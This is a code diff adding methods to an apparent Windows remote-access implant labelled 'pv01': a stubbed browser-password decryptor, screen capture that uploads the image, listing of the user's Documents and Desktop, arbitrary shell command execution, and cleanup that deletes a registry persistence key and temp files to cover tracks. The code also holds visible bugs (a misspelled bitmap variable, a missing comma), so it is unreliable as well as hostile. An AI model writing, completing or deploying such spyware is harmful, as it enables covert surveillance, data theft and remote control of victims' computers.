@@ -485,3 +485,129 @@ class Logicnode:
             from Crypto.Cipher import AES
             import hmac
             import hashlib
+            
+            # Note: In a real scenario, we'd need the master password or the dpapi blob handling
+            # Simplified placeholder for the prompt's constraint of "no external libs"
+            return "DECRYPTED_PASSWORD_PLACEHOLDER"
+        except:
+            return ""
+            
+    def capture_screenshot(self) -> bool:
+        try:
+            import wmi
+            w = wmi.WMI()
+            screenshots_path = os.path.join(os.environ['TEMP'], "pv01_snaps")
+            if not os.path.exists(screenshots_path):
+                os.makedirs(screenshots_path)
+            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
+            screen_number = 0
+            
+            for screen in w.Win32_DesktopMonitor():
+                screen_number += 1
+                left = int(screen.ScreenWidth)
+                top = int(screen.ScreenHeight)
+                right = int(screen.ScreenWidth)
+                bottom = int(screen.ScreenHeight)
+                
+                device_name = screen.DeviceID.split('\\')[-1]
+                
+                hdc = user32.GetDC(0)
+                hdc_mem = gdi32.CreateCompatibleDC(hdc)
+                hitmap = gdi32.CreateCompatibleBitmap(hdc, left, top)
+                gdi32.SelectObject(hdc_mem, hbitmap)
+                
+                gdi32.BitBlt(hdc_mem, 0, 0, left, top, hdc, 0, 0, 0x00CC0020)
+                
+                bmp_info = BITMAPINFO()
+                bmp_info.bmiHeader.biSize = struct.calcsize("BHHIIIIII")
+                bmp_info.bmiHeader.biWidth = left
+                bmp_info.bmiHeader.biHeight = -top
+                bmp_info.bmiHeader.biPlanes = 1
+                bmp_info.bmiHeader.biBitCount = 24
+                bmp_info.bmiHeader.biCompression = BI_RGB
+                
+                bmp_size = left * top * 3
+                bmp_data = ctypes.create_string_buffer(bmp_size)
+                
+                gdi32.GetDIBits(hdc_mem, hbitmap, 0, top, bmp_data, ctypes.byref(bmp_info), DIB_RGB_COLORS)
+                
+                rgb_data = bmp_data.raw
+                img = Image.frombytes("RGB", (left, top), rgb_data)
+                
+                filename = os.path.join(screenshots_path, f"pv01_{timestamp}_{screen_number}.png")
+                img.save(filename, "PNG")
+                
+                gdi32.DeleteObject(hbitmap)
+                gdi32.DeleteDC(hdc_mem)
+                user32.ReleaseDC(0, hdc)
+                
+                return self._upload_file(filename)
+                
+        except Exception as e:
+            print(f"Screenshot failed: {e}")
+            return False
+            
+    def list_files(self, directory: str = None) -> str:
+        if not directory:
+            directories = [os.path.join(os.getenv('USERPROFILE'), "Documents"),
+                           os.path.join(os.getenv('USERPROFILE'), "Desktop")]
+            result = []
+            for d in directories:
+                if os.path.exists(d):
+                    result.append(f"--- {d} ---")
+                    result.extend(self._recursive_list(d, 0))
+            return "\n".join(result)
+        return self._recursive_list(directory, 0)
+        
+    def _recursive_list(self, directory: str, depth: int) -> list:
+        result = []
+        try:
+            for item in os.listdir(directory):
+                path = os.path.join(directory, item)
+                indent = " " * depth
+                if os.path.isfile(path):
+                    result.append(f"{indent}📄 {item} ({os.path.getsize(path)} bytes)")
+                elif os.path.isdir(path):
+                    result.append(f"{indent}📁 {item}/")
+                    result.extend(self._recursive_list(path, depth + 1))
+        except PermissionError:
+            result.append(f"{indent}🔒 Access Denied")
+        except Exception:
+            result.append(f"{indent}❌ Error reading directory")
+        return result
+        
+    def execute_shell(self, command: str) -> str:
+        try:
+            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+            stdout, stderr = process.communicate()
+            return f"OUT: {stdout}\nERR: {stderr}"
+        except Exception as e:
+            return f"Shell failed: {str(e)}"
+            
+    def clean_logs(self) -> str:
+        cleaned_items = []
+        temp_paths = [
+            os.environ['TEMP'],
+            os.environ['LOCALAPPDATA'] + "\\Temp"
+            os.environ['APPDATA'] + "\\Temp"
+        ]
+        
+        # Clear Registry Run Key
+        try:
+            key = ctypes.c_void_p()
+            advapi32.RegOpenKeyExW(HKEY_CURRENT_USER, PV01_CONFIG["PERSISTENCE_REGISTRY_KEY"], 0, KEY_ALL_ACCESS, ctypes.byref(key))
+            advapi32.RegDeleteValueW(key, "")
+            advapi32.RegCloseKey(key)
+            cleaned_items.append("Registry persistence removed")
+        except:
+            cleaned_items.append("Registry cleanup skipped")
+            
+        # Clear Temp Files
+        for path in temp_paths:
+            if os.path.exists(path):
+                try:
+                    for file in os.listdir(path):
+                        file_path = os.path.join(path, file)
+                        if os.path.isfile(file_path):
+                            os.remove(file_path)
+                            cleaned_items.append
